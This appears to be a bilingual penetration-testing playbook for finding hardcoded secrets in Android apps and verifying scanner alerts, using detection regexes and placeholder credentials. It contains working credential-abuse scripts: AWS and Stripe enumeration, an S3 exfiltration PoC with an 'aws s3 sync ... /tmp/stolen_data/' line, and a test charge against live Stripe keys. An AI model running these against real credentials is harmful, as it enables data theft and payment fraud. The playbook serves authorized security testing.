# Hardcoded Secrets & Credentials Hunt

**双模式支持**:
- 🔍 **独立挖掘**: 从零开始查找硬编码密钥
- ✅ **报告验证**: 验证 SAST 工具报告中的硬编码密钥告警

---

## 📋 Part 1: 独立挖掘模式 (Independent Hunt)

### Vulnerability Type
Sensitive data hardcoded in application code or resources

### Target Locations
- Java/Kotlin source code
- strings.xml resources
- BuildConfig fields
- Native libraries (.so files)
- Assets and raw resources

### What to Look For

#### 1. API Keys and Tokens

```java
// VULNERABLE
public class ApiClient {
    private static final String API_KEY = "AIzaSyD4kH3f9d8Kg2Lm9Np0Qr1St2Uv3Wx4Yz5";
    private static final String SECRET_KEY = "sk_live_51H3f9d8Kg2Lm9Np0Qr1St2";
    private static final String AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE";
}
```

#### 2. Database Credentials

```java
// VULNERABLE
public class Database {
    private static final String DB_URL = "jdbc:mysql://db.company.com:3306/prod";
    private static final String DB_USER = "admin";
    private static final String DB_PASSWORD = "P@ssw0rd123!";
}
```

#### 3. Encryption Keys

```java
// VULNERABLE
public class Crypto {
    private static final byte[] AES_KEY = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
    };
    private static final String RSA_PRIVATE_KEY = "-----BEGIN PRIVATE KEY-----...";
}
```

#### 4. OAuth Secrets

```java
// VULNERABLE
public class OAuth {
    private static final String CLIENT_ID = "1234567890-abc123def456.apps.googleusercontent.com";
    private static final String CLIENT_SECRET = "abc123DEF456ghi789JKL012";
}
```

#### 5. Strings in Resources

```xml
<!-- VULNERABLE: res/values/strings.xml -->
<resources>
    <string name="api_key">sk_live_abc123def456</string>
    <string name="stripe_publishable_key">pk_live_xyz789</string>
    <string name="firebase_api_key">AIzaSyABC123DEF456GHI789</string>
</resources>
```

### Search Commands

```bash
# API Keys patterns
grep -r "api[_-]?key" sources/ --include="*.java" --include="*.kt" -i
grep -r "AIza[0-9A-Za-z\\-_]{35}" sources/  # Google API keys
grep -r "sk_live_[0-9a-zA-Z]{24,}" sources/  # Stripe secret keys
grep -r "AKIA[0-9A-Z]{16}" sources/  # AWS access keys

# Passwords
grep -r "password\s*=\s*\"" sources/ -i
grep -r "passwd\|pwd" sources/ --include="*.java" -i

# Database URLs
grep -r "jdbc:mysql://\|mongodb://\|postgres://" sources/

# Private keys
grep -r "BEGIN.*PRIVATE KEY" sources/
grep -r "BEGIN RSA PRIVATE KEY" sources/

# OAuth/API secrets
grep -r "client[_-]?secret" sources/ -i
grep -r "access[_-]?token" sources/ -i

# Firebase
grep -r "firebase.*api.*key\|google-services\.json" sources/ -i

# AWS
grep -r "aws.*secret.*access.*key" sources/ -i

# Check resources
grep -r "api.*key\|secret\|password" res/ -i
```

### Common Secret Patterns

#### API Keys Regex
```regex
# Google API
AIza[0-9A-Za-z\\-_]{35}

# AWS Access Key
AKIA[0-9A-Z]{16}

# Stripe
sk_live_[0-9a-zA-Z]{24,}
pk_live_[0-9a-zA-Z]{24,}

# GitHub
ghp_[0-9a-zA-Z]{36}

# Generic API key
[a-zA-Z0-9_-]{32,}
```

---

## ✅ Part 2: 报告验证模式 (Report Verification)

### Alert Identification (如何识别报告中的此类告警)

#### MobSF JSON Format

```json
{
  "code_analysis": {
    "findings": {
      "android_hardcoded_keys": [
        {
          "file": "com/app/config/ApiConfig.java",
          "line": 12,
          "description": "Hardcoded API key found",
          "key_type": "API_KEY",
          "severity": "high",
          "matched_string": "AIzaSyD4kH3f9d8Kg2Lm9Np0Qr1St2Uv3Wx4Yz5"
        }
      ],
      "android_aws_credentials": [
        {
          "file": "com/app/storage/S3Manager.java",
          "line": 23,
          "description": "AWS credentials hardcoded",
          "severity": "critical",
          "matched_string": "AKIAIOSFODNN7EXAMPLE"
        }
      ]
    }
  }
}
```

#### SonarQube XML Format

```xml
<issues>
  <issue key="security:hardcoded-credentials">
    <message>Hard coded credentials are security-sensitive</message>
    <component>com.app.config.ApiConfig</component>
    <line>12</line>
    <severity>BLOCKER</severity>
    <code>private static final String API_KEY = "AIza...";</code>
  </issue>

  <issue key="security:aws-credentials">
    <message>AWS credentials should not be hardcoded</message>
    <component>com.app.storage.S3Manager</component>
    <line>23</line>
    <severity>CRITICAL</severity>
  </issue>
</issues>
```

#### AI SAST Markdown Format (关键词匹配)

```markdown
## Finding: Hardcoded AWS Credentials

**Location**: S3Uploader.java:34-35
**Severity**: Critical
**Description**: Production AWS access keys are hardcoded in the source code.

**Code**:
```java
private static final String AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE";
private static final String AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
```
```

**识别关键词**:
- "hardcoded" + "key" / "secret" / "credential" / "password"
- "API key" / "access key" / "secret key"
- "AWS" / "Stripe" / "Firebase" / "Google API"
- Specific patterns: "AKIA", "sk_live_", "AIza"
- "credentials in code" / "exposed secret"

#### Qark JSON Format

```json
{
  "findings": [
    {
      "category": "secrets",
      "name": "Hardcoded API Key",
      "severity": 3,
      "file": "ApiConfig.java",
      "line_number": 12,
      "code_snippet": "API_KEY = \"AIzaSy...\"",
      "key_type": "google_api_key"
    }
  ]
}
```

### Verification Workflow (专业验证流程)

#### Step 1: Parse and Categorize Alert

**从报告中提取**:
- [ ] 文件路径
- [ ] 行号
- [ ] 密钥类型（API key / AWS / DB password / etc.）
- [ ] 匹配的字符串值

**分类密钥类型**:
```
Hardcoded Secrets →
├─ Type A: API Keys (Google, Stripe, GitHub, etc.)
├─ Type B: Cloud Credentials (AWS, Azure, GCP)
├─ Type C: Database Credentials (MySQL, MongoDB, etc.)
├─ Type D: Encryption Keys (AES, RSA private keys)
├─ Type E: OAuth Secrets (client_id, client_secret)
└─ Type F: Generic Tokens/Passwords
```

#### Step 2: Locate and Extract Secret

**定位代码**:
```bash
# 找到包含密钥的文件
cd decompiled/sources/
find . -name "ApiConfig.java" -exec cat {} \;

# 读取上下文（行号 ± 10）
sed -n '2,22p' com/app/config/ApiConfig.java
```

**提取完整密钥**:
```java
// 读取代码示例
package com.app.config;

public class ApiConfig {
    // Line 12 - 报告指出的位置
    private static final String API_KEY = "AIzaSyD4kH3f9d8Kg2Lm9Np0Qr1St2Uv3Wx4Yz5";

    private static final String STRIPE_SECRET = "sk_live_51H3f9d8Kg2Lm9Np0Qr1St2";

    // Line 23
    private static final String AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE";
    private static final String AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
}
```

**提取值**:
- Google API Key: `AIzaSyD4kH3f9d8Kg2Lm9Np0Qr1St2Uv3Wx4Yz5`
- Stripe Secret: `sk_live_51H3f9d8Kg2Lm9Np0Qr1St2`
- AWS Access: `AKIAIOSFODNN7EXAMPLE`
- AWS Secret: `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`

#### Step 3: Pattern Validation (排除误报)

##### 检查 1: 是否是示例/占位符值

**✅ TRUE POSITIVE (真实密钥)**:
```java
private static final String API_KEY = "AIzaSyD4kH3f9d8Kg2Lm9Np0Qr1St2Uv3Wx4Yz5";
// → 39 字符，符合 Google API key 格式
// → 不是常见示例值
```

**❌ FALSE POSITIVE (示例/占位符)**:
```java
// 场景 1: 明显的占位符
private static final String API_KEY = "YOUR_API_KEY_HERE";
private static final String API_KEY = "REPLACE_WITH_YOUR_KEY";

// 场景 2: 测试/示例值
private static final String API_KEY = "test_key_123";
private static final String API_KEY = "demo_api_key";
private static final String API_KEY = "sample_key";

// 场景 3: 空值或默认值
private static final String API_KEY = "";
private static final String API_KEY = "null";
private static final String API_KEY = "API_KEY";

// 场景 4: 已知的示例值
private static final String AWS_KEY = "AKIAIOSFODNN7EXAMPLE";  // AWS 官方示例
private static final String STRIPE_KEY = "sk_test_...";  // Stripe 测试密钥
```

**占位符/示例值列表**:
```
常见占位符:
- YOUR_*
- REPLACE_*
- INSERT_*
- CHANGEME
- TODO
- FIXME
- EXAMPLE
- SAMPLE
- TEST
- DEMO
- NULL
- PLACEHOLDER

AWS 官方示例:
- AKIAIOSFODNN7EXAMPLE
- ASIATESTACCESSKEY
- wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

Stripe 测试密钥:
- sk_test_* (测试密钥，非生产)
- pk_test_* (测试密钥，非生产)
```

##### 检查 2: 格式验证

**各类密钥的标准格式**:

| 类型 | 格式 | 长度 | 正则 |
|------|------|------|------|
| Google API | `AIza[A-Za-z0-9_-]+` | 39 | `^AIza[0-9A-Za-z\\-_]{35}$` |
| AWS Access | `AKIA[A-Z0-9]+` | 20 | `^AKIA[0-9A-Z]{16}$` |
| AWS Secret | Base64-like | 40 | `^[A-Za-z0-9/+=]{40}$` |
| Stripe Live | `sk_live_[A-Za-z0-9]+` | 32+ | `^sk_live_[0-9a-zA-Z]{24,}$` |
| GitHub PAT | `ghp_[A-Za-z0-9]+` | 40 | `^ghp_[0-9a-zA-Z]{36}$` |

**格式验证代码**:
```bash
# 验证 Google API key
echo "AIzaSyD4kH3f9d8Kg2Lm9Np0Qr1St2Uv3Wx4Yz5" | \
  grep -E "^AIza[0-9A-Za-z_-]{35}$"
# 有输出 → 格式正确

# 验证 AWS Access Key
echo "AKIAIOSFODNN7EXAMPLE" | grep -E "^AKIA[0-9A-Z]{16}$"
# 有输出 → 格式正确

# 验证 Stripe Secret
echo "sk_live_51H3f9d8Kg2Lm9Np0Qr1St2" | grep -E "^sk_live_[0-9a-zA-Z]{24,}$"
# 有输出 → 格式正确
```

##### 检查 3: 上下文分析

**查看密钥使用位置**:
```java
// 检查密钥是否真的被使用
public void makeApiCall() {
    HttpClient client = new HttpClient();
    client.setHeader("Authorization", "Bearer " + API_KEY);  // ✅ 真实使用
    client.get("https://api.example.com/data");
}

// vs 只是定义但未使用
private static final String API_KEY = "...";  // ❌ 可能是遗留代码
```

**检查是否在测试代码中**:
```bash
# 查看文件路径
# ✅ 生产代码
com/app/config/ApiConfig.java

# ❌ 测试代码（可能是测试用例）
com/app/test/MockApiConfig.java
src/androidTest/java/com/app/ApiTest.java
```

#### Step 4: Key Validation (验证密钥有效性)

**重要**: 仅在授权测试环境下验证密钥！

##### Type A: Google API Key

```bash
#!/bin/bash
# 测试 Google API key 是否有效

API_KEY="AIzaSyD4kH3f9d8Kg2Lm9Np0Qr1St2Uv3Wx4Yz5"

# 方法 1: 使用 Maps API（最常见）
curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=$API_KEY" | \
  jq -r '.status'

# 结果判断:
# "OK" 或 "ZERO_RESULTS" → ✅ 密钥有效
# "REQUEST_DENIED" → ❌ 密钥无效或受限
# "INVALID_REQUEST" → ⚠️ 密钥可能有效但参数错误

# 方法 2: 使用 Places API
curl -s "https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=0,0&radius=1000&key=$API_KEY" | \
  jq -r '.status'
```

##### Type B: AWS Credentials

```bash
#!/bin/bash
# 测试 AWS credentials 是否有效

AWS_ACCESS_KEY="AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# 配置 AWS CLI（临时）
export AWS_ACCESS_KEY_ID="$AWS_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$AWS_SECRET_KEY"
export AWS_DEFAULT_REGION="us-east-1"

# 测试密钥有效性（最小权限调用）
aws sts get-caller-identity 2>/dev/null

# 结果判断:
# 返回 JSON with UserId, Account, Arn → ✅ 密钥有效
# "InvalidClientTokenId" → ❌ Access Key 无效
# "SignatureDoesNotMatch" → ❌ Secret Key 错误

# 如果有效，检查权限范围
aws s3 ls 2>/dev/null  # 列出 S3 buckets
aws ec2 describe-instances 2>/dev/null  # 列出 EC2 实例
aws iam list-users 2>/dev/null  # 尝试管理员操作

# 清理
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY
```

##### Type C: Stripe API Key

```bash
#!/bin/bash
# 测试 Stripe secret key 是否有效

STRIPE_SECRET="sk_live_51H3f9d8Kg2Lm9Np0Qr1St2"

# 测试密钥（读取账户信息，无副作用）
curl -s https://api.stripe.com/v1/balance \
  -u "$STRIPE_SECRET:" | \
  jq -r '.object'

# 结果判断:
# "balance" → ✅ 密钥有效（返回余额信息）
# {"error": {"type": "invalid_request_error"}} → ❌ 密钥无效

# 如果有效，获取账户详情
curl -s https://api.stripe.com/v1/account \
  -u "$STRIPE_SECRET:" | \
  jq -r '{id, country, charges_enabled, payouts_enabled}'

# 这会显示:
# - 账户 ID
# - 国家
# - 是否可以收费
# - 是否可以提现
```

##### Type D: Firebase API Key

```bash
#!/bin/bash
# Firebase API key 验证

FIREBASE_API_KEY="AIzaSyABC123DEF456GHI789"

# 测试密钥（使用 Firebase Auth REST API）
curl -s "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$FIREBASE_API_KEY" \
  -H 'Content-Type: application/json' \
  -d '{}' | \
  jq -r '.error.message // "Valid"'

# 结果:
# "Valid" 或特定错误（如 MISSING_EMAIL） → ✅ API key 有效
# "API key not valid" → ❌ 密钥无效
```

**⚠️ 验证注意事项**:
1. **仅读取操作**: 不要执行任何写入/删除/收费操作
2. **记录日志**: 所有验证操作应记录到审计日志
3. **授权测试**: 确保有权限测试这些密钥
4. **立即报告**: 发现有效密钥后立即通知相关方

#### Step 5: Exploitability Assessment

**评估密钥危害程度**:

| 因素 | 检查项 | 影响 |
|------|-------|------|
| **密钥类型** | 生产环境 vs 测试环境 | sk_live_ > sk_test_ |
| **权限范围** | Admin vs ReadOnly | Full access > Limited |
| **资源访问** | 敏感数据 vs 公开数据 | PII/Payment > Logs |
| **可滥用性** | 可收费 vs 仅查询 | Can charge > Read-only |
| **暴露时长** | 已发布版本数量 | Many versions > Recent |

**CVSS 评分计算**:

```
Base Score Components:

AV:N (Network) - 密钥可远程使用
AC:L (Low) - 反编译即可提取
PR:N (None) - 无需认证
UI:N (None) - 无需用户交互
S:C (Changed) - 影响外部系统（AWS/Stripe）
C:H/M/L - 取决于密钥访问的数据
I:H/M/L - 取决于密钥的写权限
A:H/M/L - 取决于能否删除资源

Critical (9.0-10.0):
- AWS Admin credentials
- Stripe live secret key
- Database with PII

High (7.0-8.9):
- AWS limited credentials
- Google API with billing
- Firebase with write access

Medium (4.0-6.9):
- Read-only API keys
- Firebase API key (only Auth)
- Encryption keys (without data)

Low (0.1-3.9):
- Test/sandbox keys
- Expired credentials
- Public API keys (no sensitive data)
```

#### Step 6: Impact Analysis (影响分析)

##### AWS Credentials 影响分析

```bash
#!/bin/bash
# 分析 AWS credentials 的实际影响

# 1. 列出可访问的 S3 buckets
echo "[*] Checking S3 access..."
aws s3 ls

# 如果成功，检查 bucket 内容
for bucket in $(aws s3 ls | awk '{print $3}'); do
    echo "[*] Checking bucket: $bucket"
    aws s3 ls s3://$bucket --recursive --max-items 10
done

# 2. 检查 EC2 实例
echo "[*] Checking EC2 instances..."
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,State.Name,PrivateIpAddress]' --output table

# 3. 检查 RDS 数据库
echo "[*] Checking RDS databases..."
aws rds describe-db-instances --query 'DBInstances[].[DBInstanceIdentifier,Engine,DBInstanceStatus]' --output table

# 4. 尝试敏感操作（仅检测权限，不实际执行）
echo "[*] Checking IAM permissions..."
aws iam list-users --max-items 1 2>&1 | grep -q "AccessDenied" || echo "[!] Has IAM access!"
aws s3api delete-bucket --bucket test 2>&1 | grep -q "NoSuchBucket" || echo "[!] Can delete buckets!"

# 5. 检查账单（最严重）
aws ce get-cost-and-usage --time-period Start=2026-02-01,End=2026-02-28 --granularity MONTHLY --metrics BlendedCost 2>&1 | grep -q "AccessDenied" || echo "[!!!] Can access billing!"
```

**输出示例**:
```
[*] Checking S3 access...
2026-02-27 user-data-backup
2026-02-27 app-logs-prod
2026-02-27 customer-documents  ← ⚠️ 敏感数据

[*] Checking bucket: customer-documents
2026-02-27 documents/user_123/passport.pdf
2026-02-27 documents/user_456/id_card.jpg
← 🔴 CRITICAL: PII 数据泄露

[*] Checking EC2 instances...
i-0123456789 running 10.0.1.5
← ⚠️ 可能可以访问生产服务器

[!] Has IAM access!
← 🔴 CRITICAL: 可以管理用户和权限
```

##### Stripe Secret Key 影响分析

```bash
#!/bin/bash
# 分析 Stripe secret key 的实际影响

STRIPE_KEY="sk_live_51H3f9d8Kg2Lm9Np0Qr1St2"

# 1. 获取账户余额
echo "[*] Checking account balance..."
curl -s https://api.stripe.com/v1/balance -u "$STRIPE_KEY:" | \
  jq '{available: .available[0].amount, pending: .pending[0].amount, currency: .available[0].currency}'

# 2. 列出最近的支付
echo "[*] Listing recent charges..."
curl -s https://api.stripe.com/v1/charges?limit=5 -u "$STRIPE_KEY:" | \
  jq '.data[] | {id, amount, currency, status, customer}'

# 3. 列出客户信息
echo "[*] Listing customers..."
curl -s https://api.stripe.com/v1/customers?limit=5 -u "$STRIPE_KEY:" | \
  jq '.data[] | {id, email, name}'

# 4. 测试是否可以创建收费（仅测试，不实际执行）
echo "[*] Testing charge capability..."
curl -s https://api.stripe.com/v1/charges \
  -u "$STRIPE_KEY:" \
  -d amount=100 \
  -d currency=usd \
  -d source=tok_visa_debit \
  -d description="Security test" 2>&1 | \
  grep -q "succeeded" && echo "[!!!] CAN CREATE CHARGES!" || echo "[*] Charge test failed (expected)"
```

**影响评估输出**:
```json
{
  "available": 150000,  // $1,500.00 可用余额
  "pending": 25000,     // $250.00 待处理
  "currency": "usd"
}

Recent charges:
{
  "id": "ch_abc123",
  "amount": 5000,       // $50.00
  "customer": "cus_xyz789",
  "status": "succeeded"
}

Customers:
{
  "id": "cus_xyz789",
  "email": "victim@example.com",  ← 🔴 用户邮箱泄露
  "name": "John Doe"
}

[!!!] CAN CREATE CHARGES!  ← 🔴 CRITICAL: 可以盗刷
```

#### Step 7: Dynamic Verification (完整利用演示)

**⚠️ 仅用于授权测试！**

##### 场景 1: 窃取 AWS S3 数据

```bash
#!/bin/bash
# poc_aws_exfiltration.sh
# ⚠️ 仅用于授权安全测试

AWS_ACCESS="AKIAIOSFODNN7EXAMPLE"
AWS_SECRET="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

export AWS_ACCESS_KEY_ID="$AWS_ACCESS"
export AWS_SECRET_ACCESS_KEY="$AWS_SECRET"
export AWS_DEFAULT_REGION="us-east-1"

echo "[*] AWS Credential Exploitation PoC"
echo "[*] Testing hardcoded credentials from APK"
echo ""

# Step 1: 验证密钥
echo "[1] Verifying credentials..."
IDENTITY=$(aws sts get-caller-identity 2>/dev/null)
if [ $? -eq 0 ]; then
    echo "[+] Credentials valid!"
    echo "$IDENTITY" | jq '.'
else
    echo "[-] Credentials invalid"
    exit 1
fi

# Step 2: 列出 S3 buckets
echo ""
echo "[2] Listing S3 buckets..."
BUCKETS=$(aws s3 ls | awk '{print $3}')
echo "[+] Found buckets:"
echo "$BUCKETS"

# Step 3: 检查敏感数据
echo ""
echo "[3] Checking for sensitive data..."
for bucket in $BUCKETS; do
    echo "[*] Scanning bucket: $bucket"

    # 查找常见敏感文件
    aws s3 ls s3://$bucket --recursive | \
      grep -E "(user|customer|payment|card|ssn|passport|license|backup|database|dump)" | \
      head -5
done

# Step 4: 下载示例文件（演示）
echo ""
echo "[4] Downloading sample file (for demonstration)..."
# aws s3 cp s3://customer-documents/sample.txt /tmp/exfiltrated.txt
echo "[*] In real attack, attacker would download sensitive files"

# Cleanup
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY

echo ""
echo "[*] PoC complete. Impact: Full S3 access, PII exposure"
```

##### 场景 2: Stripe 未授权收费

```bash
#!/bin/bash
# poc_stripe_charge.sh
# ⚠️ 仅用于演示，不实际执行收费

STRIPE_KEY="sk_live_51H3f9d8Kg2Lm9Np0Qr1St2"

echo "[*] Stripe Secret Key Exploitation PoC"
echo "[*] Using hardcoded key from APK"
echo ""

# Step 1: 获取账户信息
echo "[1] Retrieving account information..."
curl -s https://api.stripe.com/v1/account \
  -u "$STRIPE_KEY:" | \
  jq '{
    id: .id,
    country: .country,
    email: .email,
    business_name: .business_profile.name,
    charges_enabled: .charges_enabled
  }'

# Step 2: 列出客户
echo ""
echo "[2] Listing customers with payment methods..."
curl -s "https://api.stripe.com/v1/customers?limit=3" \
  -u "$STRIPE_KEY:" | \
  jq '.data[] | {
    id: .id,
    email: .email,
    name: .name,
    default_source: .default_source
  }'

# Step 3: 模拟未授权收费（仅测试，不实际执行）
echo ""
echo "[3] Testing charge capability..."
echo "[*] In real attack, attacker would execute:"
echo "    curl https://api.stripe.com/v1/charges \\"
echo "      -u \"$STRIPE_KEY:\" \\"
echo "      -d amount=100000 \\  # \$1,000.00"
echo "      -d currency=usd \\"
echo "      -d customer=cus_xyz789 \\"
echo "      -d description=\"Unauthorized charge\""

echo ""
echo "[!!!] CRITICAL: Can create unauthorized charges"
echo "[!!!] Impact: Financial fraud, PCI-DSS violation"
```

**预期输出**:
```json
[1] Retrieving account information...
{
  "id": "acct_abc123",
  "country": "US",
  "email": "billing@company.com",
  "business_name": "Example Corp",
  "charges_enabled": true  ← 🔴 可以收费
}

[2] Listing customers...
{
  "id": "cus_xyz789",
  "email": "victim@example.com",
  "name": "John Doe",
  "default_source": "card_abc123"  ← 🔴 有绑定的信用卡
}

[!!!] CRITICAL: Can create unauthorized charges
```

### Common False Positives (常见误报及识别)

| 报告描述 | 实际代码 | 判断 | 原因 |
|---------|---------|------|------|
| "Hardcoded API key" | `String KEY = "YOUR_API_KEY_HERE"` | ❌ 误报 | 占位符，非真实密钥 |
| "AWS credentials found" | `String KEY = "AKIAIOSFODNN7EXAMPLE"` | ❌ 误报 | AWS 官方示例值 |
| "Stripe secret key" | `String KEY = "sk_test_abc123"` | ⚠️ 低危 | 测试密钥，非生产环境 |
| "Database password" | `String PWD = "password"` | ❌ 误报 | 通用词，非实际密码 |
| "API key in code" | `String KEY = "api_key_" + getUserInput()` | ❌ 误报 | 动态生成，非硬编码 |
| "Hardcoded secret" | 在测试文件中 | ⚠️ 信息 | 测试代码，影响较小 |
| "Firebase API key" | `AIza...` 但已失效 | ⚠️ 低危 | 密钥已轮换 |
| "Encryption key" | `byte[] KEY = new byte[16]` 全0 | ❌ 误报 | 初始化代码，非实际密钥 |

**过滤误报的检查清单**:
- [ ] 是否是占位符/示例值？（YOUR_, REPLACE_, TODO, EXAMPLE）
- [ ] 是否是已知的测试值？（官方文档示例）
- [ ] 是否在测试代码中？（test/, androidTest/）
- [ ] 格式是否正确？（长度、前缀、字符集）
- [ ] 是否真的被使用？（代码中有调用）
- [ ] 是否是生产环境？（sk_live vs sk_test）
- [ ] 密钥是否有效？（API 验证）

### Severity Assessment (严重性评估)

**Critical (9.0-10.0)**:
- ✅ AWS credentials with admin/full access
- ✅ Stripe live secret key (can charge)
- ✅ Database credentials with PII
- ✅ Root/master encryption keys

**High (7.0-8.9)**:
- ✅ AWS credentials with limited access (S3, EC2)
- ✅ Google API key with billing enabled
- ✅ Firebase keys with write access
- ✅ PayPal production credentials

**Medium (4.0-6.9)**:
- ✅ Read-only API keys
- ✅ Firebase API keys (Auth only)
- ✅ Encryption keys without access to encrypted data
- ✅ OAuth client secrets (limited scope)

**Low (0.1-3.9)**:
- ✅ Test/sandbox keys (sk_test_)
- ✅ Expired credentials
- ✅ API keys for public data only
- ✅ Keys in test code (not production)

### Expected Verification Output (验证结果输出)

#### 真实漏洞示例

```markdown
## Verification Result: ✅ CONFIRMED CRITICAL VULNERABILITY

### Alert Information
- **Source**: AI SAST Report
- **Finding**: Hardcoded AWS Credentials
- **File**: com/app/storage/S3Uploader.java
- **Line**: 34-35
- **Reported CVSS**: 9.8

### Credentials Extracted
```java
private static final String AWS_ACCESS_KEY = "AKIAI44QH8DHBEXAMPLE";
private static final String AWS_SECRET_KEY = "je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY";
```

### Validation Results

#### Format Check
- ✅ AWS Access Key format valid (20 chars, starts with AKIA)
- ✅ AWS Secret Key format valid (40 chars, Base64-like)
- ❌ Not in placeholder list
- ❌ Not AWS official example value

#### Authenticity Check
```bash
$ aws sts get-caller-identity
{
  "UserId": "AIDAI23HXK2EXAMPLE",
  "Account": "123456789012",
  "Arn": "arn:aws:iam::123456789012:user/prod-app-user"
}
```
- ✅ Credentials VALID
- ⚠️ Account: Production (123456789012)
- ⚠️ User: prod-app-user (production service account)

#### Permission Analysis
```bash
$ aws s3 ls
2026-02-27 customer-documents
2026-02-27 user-uploads
2026-02-27 payment-receipts
```
- 🔴 **Can list S3 buckets** (3 buckets found)
- 🔴 **Can access customer-documents** (contains PII)
- 🔴 **Can read payment-receipts** (financial data)

```bash
$ aws s3 ls s3://customer-documents --recursive | head -5
documents/user_1001/passport_scan.pdf
documents/user_1002/drivers_license.jpg
documents/user_1003/ssn_card.pdf
backups/customer_db_2026-02-26.sql.gz
```
- 🔴 **CRITICAL: PII documents accessible**
- 🔴 **Database backups exposed**

#### Impact Assessment
- ✅ **Confidentiality**: HIGH - Full access to user PII, financial records
- ✅ **Integrity**: MEDIUM - Can upload/modify files
- ✅ **Availability**: LOW - Can delete files but no EC2 access

### CVSS Verification
**Calculated CVSS: 9.8 (Critical)** - ✅ Matches report

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L
```

### Proof of Concept
```bash
# Exfiltrate sensitive documents
aws s3 sync s3://customer-documents /tmp/stolen_data/

# Result: 1,247 files downloaded (12.3 GB)
# Includes: passports, IDs, SSN cards, database backups
```

### Remediation
1. **Immediate**: Rotate AWS credentials (revoke AKIAI44QH8DHBEXAMPLE)
2. **Short-term**: Use AWS SDK with IAM roles, remove hardcoded keys
3. **Long-term**: Implement secrets management (AWS Secrets Manager)
4. **Monitoring**: Audit S3 access logs for unauthorized access

**Priority**: P0 (CRITICAL - Immediate action required)
```

#### 误报示例

```markdown
## Verification Result: ❌ FALSE POSITIVE

### Alert Information
- **Source**: MobSF Report
- **Finding**: Hardcoded API Key
- **File**: com/app/config/SampleConfig.java
- **Line**: 23

### Extracted Value
```java
private static final String API_KEY = "YOUR_API_KEY_HERE";
```

### Analysis
- ❌ **Placeholder value detected**: "YOUR_API_KEY_HERE"
- ✅ File located in: `src/main/java/com/app/config/SampleConfig.java`
- ✅ **Context**: Sample configuration file for developers

### Format Check
- ❌ Does not match any known API key format
- ✅ Matches placeholder pattern (YOUR_*)

### Usage Analysis
```bash
$ grep -r "SampleConfig" sources/
# No actual usage found in production code
# Only referenced in README.md as configuration example
```

### Conclusion
- ❌ **Not a real API key** - Placeholder for documentation
- ✅ Safe to ignore
- 📝 Recommendation: Add comment clarifying it's a placeholder

**Status**: False Positive (No action required)
```

---

## 📚 Part 3: 通用部分 (Common Resources)

### Validation Checklist

- [ ] Found hardcoded API keys
- [ ] Found hardcoded passwords/secrets
- [ ] Found database credentials
- [ ] Found encryption keys
- [ ] Found OAuth client secrets
- [ ] Keys are valid (not dummy/example values)
- [ ] Keys grant access to production systems
- [ ] No obfuscation or encryption

### CVSS Scoring Guidance

**Typical Score: 7.5 - 9.8 (High to Critical)**

| Metric | Value | Reasoning |
|--------|-------|-----------|
| AV | Network | Keys can be extracted remotely |
| AC | Low | Easy to decompile and find |
| PR | None | Just need APK file |
| UI | None | No user interaction |
| S | Changed | Affects backend systems |
| C | High | Full access to protected resources |
| I | High | Can modify data via API |
| A | High | Can delete/corrupt data |

Score is Critical (9.0+) if:
- Production payment credentials (Stripe, PayPal)
- AWS/cloud credentials with admin access
- Database with PII/financial data
- Master encryption keys

### Remediation

#### Fix 1: Use Android Keystore

```java
// SECURE - Store keys in Android Keystore
public class SecureKeyManager {
    private static final String KEY_ALIAS = "api_key";

    public static void storeApiKey(String apiKey) throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance(
            KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");

        keyGen.init(new KeyGenParameterSpec.Builder(
            KEY_ALIAS,
            KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)
            .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
            .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
            .setUserAuthenticationRequired(false)
            .build());

        SecretKey key = keyGen.generateKey();

        // Encrypt API key
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        byte[] encrypted = cipher.doFinal(apiKey.getBytes());

        // Store encrypted value in SharedPreferences
        getSharedPreferences("secure", MODE_PRIVATE)
            .edit()
            .putString("encrypted_key", Base64.encodeToString(encrypted, 0))
            .apply();
    }
}
```

#### Fix 2: Use Environment Variables (Backend)

```java
// SECURE - Fetch from server at runtime
public class ApiClient {
    private String apiKey;

    public void initialize() {
        // Fetch from authenticated backend API
        retrofit.create(ConfigService.class)
            .getApiKey()
            .enqueue(new Callback<ConfigResponse>() {
                @Override
                public void onResponse(Response<ConfigResponse> response) {
                    apiKey = response.body().getApiKey();
                }
            });
    }
}
```

#### Fix 3: Rotate Compromised Keys

```bash
# If keys are already exposed in released APK:

# 1. Immediately revoke old keys
# AWS
aws iam delete-access-key --access-key-id AKIAI44QH8DHBEXAMPLE

# Stripe
curl https://api.stripe.com/v1/api_keys/sk_live_abc123 \
  -u ADMIN_KEY: \
  -X DELETE

# 2. Generate new keys
# 3. Update backend to accept new keys
# 4. Release app update with new key management
# 5. Force update for users
# 6. Monitor for abuse of old keys
```

### Real-World Impact Examples

#### Example 1: Hardcoded AWS Keys
